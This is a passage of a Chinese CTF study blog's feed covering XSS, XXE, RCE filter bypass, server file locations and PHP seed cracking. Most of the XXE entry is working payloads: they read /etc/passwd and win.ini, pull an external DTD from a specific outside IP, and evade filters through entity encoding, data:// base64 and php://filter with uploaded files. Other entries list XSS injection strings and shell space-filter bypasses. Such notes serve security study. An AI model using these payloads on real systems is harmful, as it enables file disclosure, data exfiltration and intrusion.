    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/20175211lyz/p/12207467.html" target="_blank" rel="noopener">CTF XSS</a><br><a href="https://www.freebuf.com/articles/web/244253.html" target="_blank" rel="noopener">XSS Challenges通关和Beef介绍</a></p><blockquote><p>1:没有过滤,直接用标签即可 </p><script>alert(document.domain);</script><p>2:闭合标签,再引入script<br>11111”&gt;<script>alert(document.domain);</script><br>#或者闭合前边引号,引入事件<br>“ onmouseover=alert(document.domain)&gt; </p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/20175211lyz/p/12207467.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CTF XSS&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.freebuf.
      
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF XXE</title>
    <link href="http://yoursite.com/2020/05/13/CTF-XXE/"/>
    <id>http://yoursite.com/2020/05/13/CTF-XXE/</id>
    <published>2020-05-13T03:27:43.000Z</published>
    <updated>2020-09-08T11:23:33.882Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接：<br><a href="https://www.freebuf.com/vuls/194112.html" target="_blank" rel="noopener">XXE萌新进阶全攻略</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">未知攻焉知防——XXE漏洞攻防</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&mid=2247489349&idx=1&sn=ab435be65bc6c35a21ea4bd040693d8c&source=41#wechat_redirect" target="_blank" rel="noopener">歪？我想要一个XXE。</a><br><a href="http://www.cl4y.top/xxe笔记/" target="_blank" rel="noopener">xxe笔记</a><br><a href="https://blog.szfszf.top/tech/blind-xxe-详解-google-ctf-一道题目分析/" target="_blank" rel="noopener">Blind XXE 详解 + Google CTF 一道题目分析</a><br><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html" target="_blank" rel="noopener">CTF XXE</a></p><h1 id="XXE-Attack"><a href="#XXE-Attack" class="headerlink" title="XXE Attack"></a>XXE Attack</h1><p>XML External Entity attack 即XXE XML外部实体攻击，通过构建非法xml实体，能够达到任意文件读取，甚至rce的目的。 </p><a id="more"></a><p>用以下的php代码来测试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h1><p>XML 即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是： HTML 被设计用来显示数据 XML 被设计用来传输和存储数据 </p><blockquote><p>参数实体用% name申明，引用时用%name;，只能在DTD中申明，DTD中引用。 </p><p>其余实体直接用name申明，引用时用&name;，只能在DTD中申明，可在xml文档中引用。 </p></blockquote><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。<br>DTD的声明：指XML文档中声明该文档的DTD或DTD来源的部分，可以包含在使用它的XML文档内部，也可以以独立的DTD文档（*.dtd）文档存在。</p><p>所以DTD一般认为有两种引用或声明方式：</p><blockquote><p>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。<br>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。<br>（网上有提到的引用公共DTD其实也算外部引用DTD的一种）</p></blockquote><h3 id="XML基本文档结构"><a href="#XML基本文档结构" class="headerlink" title="XML基本文档结构"></a>XML基本文档结构</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--DTD，这部分可选的--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [ </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span>                                                                          </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>DTD</strong> 引用方式(简要了解)</p><p><strong>1. DTD</strong> <strong>内部声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p><strong>2. DTD</strong> <strong>外部引用</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;外部DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>3.</strong> <strong>引用公共</strong>DTD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  &lt;!DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;......命名方法：以!DOCTYPE开始,configuration是文档根元素名称；PUBLIC表示是公共DTD；-表示是非ISO组织；mybatis.org表示组织；DTD 表示类型；Config 表示标签；3.0是标签后附带的版本号；EN表示DTD语言是英语；最后是DTD的URL；</span><br></pre></td></tr></table></figure><p><strong>DTD</strong> 实体声明</p><p><strong>1.</strong> <strong>内部实体声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号，示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;Thinking&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p><strong>2.</strong> <strong>外部实体声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p><strong>3.</strong> <strong>参数实体声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">or</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;</span><br><span class="line">%xxe;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;evil;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>外部evil.dtd中的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY evil SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;</span><br></pre></td></tr></table></figure><h1 id="XXE-简介"><a href="#XXE-简介" class="headerlink" title="XXE 简介"></a>XXE 简介</h1><p>外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 </p><h3 id="恶意引入外部实体0x01"><a href="#恶意引入外部实体0x01" class="headerlink" title="恶意引入外部实体0x01"></a>恶意引入外部实体0x01</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="恶意引入外部实体0x02"><a href="#恶意引入外部实体0x02" class="headerlink" title="恶意引入外部实体0x02"></a>恶意引入外部实体0x02</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % file SYSTEM "http://118.25.14.40:8200/hack.dtd"&gt;</span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;hhh;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p>hack.dtd内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">hhh</span> <span class="attr">SYSTEM</span> '<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>'&gt;</span></span><br></pre></td></tr></table></figure><h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>这个很简单，利用正则匹配的不严格，大小写绕过</p><h3 id="html实体编码绕过"><a href="#html实体编码绕过" class="headerlink" title="html实体编码绕过"></a>html实体编码绕过</h3><p>如果过滤了http等协议，可以利用实体编码绕过：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % a " &lt;!ENTITY %  b SYSTEM 'http://118.25.14.40:8200/hack.dtd'&gt; "&gt; </span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">    %b;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;hhh;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="data-协议绕过"><a href="#data-协议绕过" class="headerlink" title="data://协议绕过"></a>data://协议绕过</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % a SYSTEM "data://text/plain;base64,PCFFTlRJVFkgJSAgYiBTWVNURU0gJ2h0dHA6Ly8xMTguMjUuMTQuNDA6ODIwMC9oYWNrLmR0ZCc+"&gt;</span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">    %b;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;hhh;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--编码内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">b</span> <span class="attr">SYSTEM</span> '<span class="attr">http:</span>//<span class="attr">118.25.14.40:8200</span>/<span class="attr">hack.dtd</span>'&gt;</span></span><br></pre></td></tr></table></figure><h3 id="file-协议加文件上传"><a href="#file-协议加文件上传" class="headerlink" title="file://协议加文件上传"></a>file://协议加文件上传</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % a SYSTEM "file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg"&gt;</span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">b</span> <span class="attr">SYSTEM</span> '<span class="attr">http:</span>//<span class="attr">118.25.14.40:8200</span>/<span class="attr">hack.dtd</span>'&gt;</span></span><br></pre></td></tr></table></figure><h3 id="php-filter协议加文件上传"><a href="#php-filter协议加文件上传" class="headerlink" title="php://filter协议加文件上传"></a>php://filter协议加文件上传</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % a SYSTEM "php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg"&gt;</span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        &amp;hhh;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">hhh</span> <span class="attr">SYSTEM</span> '<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">./flag.php</span>'&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % a SYSTEM "php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg"&gt;</span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        &amp;hhh;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line">PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考链接：&lt;br&gt;&lt;a href=&quot;https://www.freebuf.com/vuls/194112.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;XXE萌新进阶全攻略&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://security.tencent.com/index.php/blog/msg/69&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;未知攻焉知防——XXE漏洞攻防&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247489349&amp;idx=1&amp;sn=ab435be65bc6c35a21ea4bd040693d8c&amp;source=41#wechat_redirect&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;歪？我想要一个XXE。&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.cl4y.top/xxe笔记/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;xxe笔记&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://blog.szfszf.top/tech/blind-xxe-详解-google-ctf-一道题目分析/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Blind XXE 详解 + Google CTF 一道题目分析&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.cnblogs.com/20175211lyz/p/11413335.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CTF XXE&lt;/a&gt;&lt;/p&gt;&lt;h1 id=&quot;XXE-Attack&quot;&gt;&lt;a href=&quot;#XXE-Attack&quot; class=&quot;headerlink&quot; title=&quot;XXE Attack&quot;&gt;&lt;/a&gt;XXE Attack&lt;/h1&gt;&lt;p&gt;XML External Entity attack 即XXE XML外部实体攻击，通过构建非法xml实体，能够达到任意文件读取，甚至rce的目的。 &lt;/p&gt;
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF RCE(远程代码执行)</title>
    <link href="http://yoursite.com/2020/05/13/CTF-RCE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://yoursite.com/2020/05/13/CTF-RCE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2020-05-13T03:08:02.000Z</published>
    <updated>2020-09-08T11:19:27.466Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/20175211lyz/p/11396392.html" target="_blank" rel="noopener">CTF RCE(远程代码执行)</a></p><h1 id="命令中空格被过滤的解决方法"><a href="#命令中空格被过滤的解决方法" class="headerlink" title="命令中空格被过滤的解决方法"></a>命令中空格被过滤的解决方法</h1><p>linux</p><blockquote><p>{cat,flag.txt}<br>cat${IFS}flag.txt<br>cat$IFS$9flag.txt<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt<br>kg=$’\x20flag.txt’&amp;&amp;cat$kg<br>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</p></blockquote><a id="more"></a><p>windows下</p><blockquote><p>type.\flag.txt<br>type,flag.txt<br>echo,123456</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/20175211lyz/p/11396392.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CTF RCE(远程代码执行)&lt;/a&gt;&lt;/p&gt;&lt;h1 id=&quot;命令中空格被过滤的解决方法&quot;&gt;&lt;a href=&quot;#命令中空格被过滤的解决方法&quot; class=&quot;headerlink&quot; title=&quot;命令中空格被过滤的解决方法&quot;&gt;&lt;/a&gt;命令中空格被过滤的解决方法&lt;/h1&gt;&lt;p&gt;linux&lt;/p&gt;&lt;blockquote&gt;
&lt;p&gt;{cat,flag.txt}&lt;br&gt;cat${IFS}flag.txt&lt;br&gt;cat$IFS$9flag.txt&lt;br&gt;cat&amp;lt;flag.txt&lt;br&gt;cat&amp;lt;&amp;gt;flag.txt&lt;br&gt;kg=$’\x20flag.txt’&amp;amp;&amp;amp;cat$kg&lt;br&gt;(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>常见文件目录</title>
    <link href="http://yoursite.com/2020/05/12/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95/"/>
    <id>http://yoursite.com/2020/05/12/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95/</id>
    <published>2020-05-12T15:18:56.000Z</published>
    <updated>2020-09-08T11:23:29.189Z</updated>
    
    <content type="html"><![CDATA[<h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>web服务器会将请求写入到日志文件中，比如说apache。当用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在/var/log/apahce2/ </p><a id="more"></a><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>登录注册类型要么sql注入要么session文件包含</p><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><ul><li>php默认生成的Session文件往往存在/tmp目录下</li><li>文件名为sess_PHPSESSID</li><li>session.upload_progress.enabled这个参数在php.ini默认开启，如果不是Off，就会在上传过程中生成上传进度文件，它的储存文件路径可以在phpinfo获取到</li></ul><h2 id="Nginx重要文件位置"><a href="#Nginx重要文件位置" class="headerlink" title="Nginx重要文件位置"></a>Nginx重要文件位置</h2><ul><li>配置文件存放目录：/etc/nginx</li><li>主配置文件：/etc/nginx/conf/nginx.conf 或 /etc/nginx/nginx.conf</li><li>管理脚本：/usr/lib64/systemd/system/nginx.service</li><li>模块：/usr/lisb64/nginx/modules</li><li>应用程序：/usr/sbin/nginx</li><li>程序默认存放位置：/usr/share/nginx/html</li><li>日志默认存放位置：/var/log/nginx</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;日志文件&quot;&gt;&lt;a href=&quot;#日志文件&quot; class=&quot;headerlink&quot; title=&quot;日志文件&quot;&gt;&lt;/a&gt;日志文件&lt;/h2&gt;&lt;p&gt;web服务器会将请求写入到日志文件中，比如说apache。当用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在/var/log/apahce2/ &lt;/p&gt;
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>php_mt_seed</title>
    <link href="http://yoursite.com/2020/05/11/php-mt-seed/"/>
    <id>http://yoursite.com/2020/05/11/php-mt-seed/</id>
    <published>2020-05-11T10:49:20.000Z</published>
    <updated>2020-09-08T11:23:39.196Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/vuls/192012.html" target="_blank" rel="noopener">PHP mt_rand安全杂谈及应用场景详解</a><br><a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_seed - PHP mt_rand() seed cracker</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass_now = &quot;FpCyLNvPOj&quot;;</span><br><span class="line">$allowable_characters = &apos;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;;</span><br><span class="line"></span><br><span class="line">$length = strlen($allowable_characters) - 1;</span><br><span class="line"></span><br><span class="line">for ($j = 0; $j &lt; strlen($pass_now); $j++) &#123;</span><br><span class="line">    for ($i = 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        if ($pass_now[$j] == $allowable_characters[$i]) &#123;</span><br><span class="line">            echo &quot;$i $i 0 $length &quot;;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/vuls/192012.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PHP mt_rand安全杂谈及应用场景详解&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.open
      
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>bypass open_basedir</title>
    <link href="http://yoursite.com/2020/05/11/bypass-open-basedir/"/>
    <id>http://yoursite.com/2020/05/11/bypass-open-basedir/</id>
    <published>2020-05-11T03:34:45.000Z</published>
    <updated>2020-09-08T11:19:04.057Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">bypass open_basedir的新方法</a><br><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#ini-set%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98%E6%8E%A2%E7%B4%A2" target="_blank" rel="noopener">从PHP底层看open_basedir bypass</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/4720&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;bypass open_basedir的新方法&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://skysec.top/2019/04/
      
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>一些不包含数字和字母的webshell</title>
    <link href="http://yoursite.com/2020/05/11/%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/"/>
    <id>http://yoursite.com/2020/05/11/%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/</id>
    <published>2020-05-11T03:33:18.000Z</published>
    <updated>2020-09-08T11:20:28.164Z</updated>
    
